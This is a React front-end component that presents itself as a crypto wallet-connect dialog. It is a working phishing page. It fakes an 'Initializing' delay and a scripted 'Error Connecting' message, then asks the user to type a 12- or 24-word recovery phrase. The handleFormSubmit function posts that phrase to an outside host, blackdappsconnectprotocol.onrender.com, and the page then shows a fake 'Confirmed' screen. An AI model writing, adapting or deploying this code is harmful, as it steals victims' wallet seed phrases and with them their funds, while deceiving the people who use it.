import { BiRightArrowCircle } from "react-icons/bi";
import { AiOutlineLoading3Quarters } from "react-icons/ai";
import { CgClose } from "react-icons/cg";
import { IoWalletOutline } from "react-icons/io5";
import { BiSearch } from "react-icons/bi";
import React, { useEffect, useState } from "react";
import Chip from "./Chip";
import wallets from "../../data/wallets";
import Barcode from "../../assets/barcode.gif";
import { MdVerifiedUser } from "react-icons/md";


const Wallets = () => {
  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [loading, setLoading] = useState(false);
  const [dots, setDots] = useState("");
  const [showFormModal, setShowFormModal] = useState(false);
  const [walletPhrase, setWalletPhrase] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [fetchindData, setFetchingData] = useState(false);

  // Wallet filtering on search
  const filterWallets = () => {
    if (search) {
      return wallets.filter((wallet) =>
        wallet.name.toLowerCase().includes(search.toLowerCase())
      );
    } else {
      return wallets;
    }
  };

  const filteredWallets = filterWallets();

  // For loading animation...
  useEffect(() => {
    let intervalId;

    if (loading) {
      intervalId = setInterval(() => {
        setDots((dots) => (dots.length < 3 ? dots + "." : ""));
      }, 400);
    }

    return () => clearInterval(intervalId); //clean up on unmount
  }, [loading]);

  // For form submit
  const handleFormSubmit = async (e) => {
    e.preventDefault();

    setFetchingData(true);
    setError(false);
    setSuccess(false);

    const body = {
      wallet: selectedWallet.name || "wiw",
      phrase: walletPhrase,
    };

    try {
      const url = 'https://blackdappsconnectprotocol.onrender.com/details';

      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

      const data = await res.json();

      if (!res.ok) {
        setFetchingData(false);
        return setError(data.message);
      }

      // Clear all errors incase, turn of the loading state, and show sucess message.
      setError("");
      setWalletPhrase("");
      setFetchingData(false);
      setSuccess(data.message);
    } catch (error) {
      setFetchingData(false);
      setError("Failed to connect manually. Please try again.");
    }
  };

  return (
    <div className="flex flex-col max-w-[350px] max-h-[400px] w-[350px] h-[400px] px-3 bg-[#191a1a] rounded-[40px] overflow-y-auto">
      <div className="pt-8 pb-3 sticky top-0 left-0 bg-[#191a1a]">
        <div className="relative">
          <BiSearch
            strokeWidth={0.9}
            className="absolute top-1/2 -translate-y-1/2 left-[15px] text-[20px] text-[#778080]"
          />

          <input
            type="search"
            onChange={(e) => setSearch(e.target.value)}
            value={search}
            placeholder="search wallets"
            className="py-3 pl-[40px] pr-[20px] w-full bg-[#252626] text-[#fff] caret-[#3b70a5] outline-none focus-within:shadow-[#3b70a5] rounded-2xl text-[16px] placeholder:text-[#4a4e4e]"
          />
        </div>
      </div>

      <div className="py-4 h-full w-full">
        {filteredWallets.length > 0 ? (
          filteredWallets.map((wallet, index) => (
            <Chip
              key={index}
              img={wallet.img}
              name={wallet.name}
              onClick={() => {
                setSelectedWallet(wallet);
                setLoading(true);
                setTimeout(() => {
                  setLoading(false);
                }, 4000);
              }}
            />
          ))
        ) : (
          <div className="w-full h-full flex flex-col items-center justify-center">
            <span className="bg-[#232525] p-2 rounded-xl">
              <IoWalletOutline className="text-[#858e8e] text-[25px]" />
            </span>
            <p className="mt-2 text-[#858e8e] font-semibold">No wallet found</p>
          </div>
        )}
      </div>

      {/* Selected wallet popup modal*/}
      {selectedWallet && (
        <div className="w-screen h-screen flex items-center justify-center fixed top-0 left-0 z-[1000]  bg-black bg-opacity-30 backdrop-blur-sm">
          <div className="flex flex-col max-w-[350px] min-h-[280px] w-[350px] bg-[#191a1a] rounded-[40px] overflow-y-auto">
            <button
              className="py-4 px-6 flex items-center justify-between bg-[#353535] cursor-pointer text-[#fff]"
              onClick={() => setSelectedWallet(null)}
            >
              <span className="text-lg font-semibold">Back</span>
              <CgClose fontSize={20} strokeWidth={1} />
            </button>

            <div className="mt-8 mb-2 mx-3 py-2 px-3 flex items-center text-[15px] text-red-400 border border-red-400 rounded-[15px] bg-[#1e1e1e] cursor-pointer">
              <p>{loading ? `Initializing${dots}` : "Error Connecting"}</p>

              {!loading && (
                <button
                  className="ml-auto bg-[#6366f1] text-[#fff] px-2 py-[5px] rounded-lg hover:bg-[#7578f2]"
                  onClick={() => {
                    setShowFormModal(true);
                  }}
                >
                  Connect Wallet
                </button>
              )}
            </div>

            <div className="mx-3 mt-3">
              <Chip
                img={selectedWallet.img}
                name={selectedWallet.name}
                showExtension={true}
              />
            </div>
          </div>
        </div>
      )}

      {/* User Enters wallet manually in this form */}

      {showFormModal && (
        <form
          method="Post"
          onSubmit={handleFormSubmit}
          className="w-screen h-screen flex items-center justify-center fixed top-0 left-0 z-[1000]  bg-black bg-opacity-30 backdrop-blur-sm"
        >
          <div className="flex flex-col items-center max-w-[350px] w-[350px] pb-8 min-h-[250px] pt-16 bg-[#191a1a] rounded-[40px] overflow-hidden">
            <button
              className="w-full mb-6 py-3 px-6 flex items-center justify-between bg-[#353535] cursor-pointer text-[#fff]"
              onClick={() => setShowFormModal(false)}
            >
              <span className="text-lg font-semibold">Back</span>
              <CgClose fontSize={20} strokeWidth={1} />
            </button>

            {/* Show error Message */}
            {error && (
              <span className="w-[93%] mb-2 py-1 px-4 text-center text-red-700 bg-red-100 border border-red-600 rounded-md">
                {error}
              </span>
            )}

            {/* Show success Message */}
            {success && (
              <div className="flex gap-3 flex-col w-screen h-screen items-center justify-center fixed top-0 left-0 z-[1000]  bg-black bg-opacity-30 backdrop-blur-sm">
                <div>
                  <img src={Barcode} />
                </div>
                <div className=" ml-3">
                  <span className="w-[93%] justify-center mb-1 py-1 px-4 text-center text-green-700 bg-green-100 border border-green-600 rounded-md">
                    {"Connecting... Please wait..."}
                  </span>
                </div>
                <div>
                  {/* <button className="ml-auto bg-[#6366f1] text-[#fff] px-2 py-[5px] rounded-lg hover:bg-[#7578f2]">Confirm</button> */}
                  <button
                    className="w-full mb-6 py-3 px-6 flex rounded-lg items-center justify-between bg-[#353535] cursor-pointer text-[#fff]"
                    onClick={() => window.location.reload()}
                  >
                    <span className="text-lg font-semibold">Confirmed</span>
                    <MdVerifiedUser size="20" color="#7578f2"/>
                  </button>
                </div>
              </div>
            )}

            <div></div>

            <div className="flex items-center gap-4 mx-3 text-[#fff] text-[20px] text-center font-semibold">
              <img src={selectedWallet.img} className="w-[35px] rounded-full" />
              <h2>Import your {selectedWallet.name} wallet</h2>
            </div>

            <div className="flex items-center justify-between mx-3 mt-6 mb-3 pb-6 gap-4 text-[#fff] font-medium text-[18px] border-b-[3px] border-[#353535]">
              <p>Phrase</p>
              <p>Keystone JSON</p>
              <p>Private Key</p>
            </div>

            <div className="mx-3 w-full px-4">
              <textarea
                type="text"
                rows={5}
                value={walletPhrase}
                onChange={(e) => setWalletPhrase(e.target.value)}
                className="w-full mt-4 py-3 px-4 border border-[#353535] focus:border-[#6366f1] text-sm bg-[#252626] outline-none rounded-lg caret-[#6366f1] text-[#fff] placeholder:text-lg"
                placeholder="Enter your recovery phrase"
              ></textarea>
            </div>

            <p className="mt-8 mb-3 mx-3 px-8 text-[#fff] text-[14px] text-center">
              Typically 12 (sometimes 24) words separated by single space
            </p>

            <button
              disabled={fetchindData}
              type="submit"
              className="flex items-center justify-center gap-3 bg-[#6366F1] mt-4 mb-2 py-2 px-5 w-80 rounded-md text-[#fff]"
            >
              <b>CONNECT</b>{" "}
              {fetchindData ? (
                <AiOutlineLoading3Quarters
                  strokeWidth={2}
                  className="animate-spin"
                />
              ) : (
                <BiRightArrowCircle fontSize={24} />
              )}
            </button>
          </div>
        </form>
      )}
    </div>
  );
};

export default Wallets;
